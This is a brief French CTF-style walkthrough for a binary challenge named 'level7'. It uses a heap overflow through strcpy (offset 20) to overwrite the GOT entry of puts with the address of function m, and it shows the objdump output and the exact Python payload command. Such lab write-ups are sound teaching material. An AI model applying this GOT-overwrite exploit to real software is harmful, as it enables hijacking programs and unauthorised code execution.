# level7

On fait un buffer overflow sur le 1er `strcpy` avec notre `argv[1]` pour modifier l'adresse du 1ere argument du 2nd `strcpy` (offset de 20)

Grâce au GOT, on obtient l'adresse de `puts()`:
```
$ objdump -R ./level7

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts <-----------
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

À l'adresse de `puts`, on y écrit l'adresse de `m`:
```
(gdb) info function
# 0x080484f4  m
```

Le payload:
```bash
./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c 'print "\xf4\x84\x04\x08"')
```
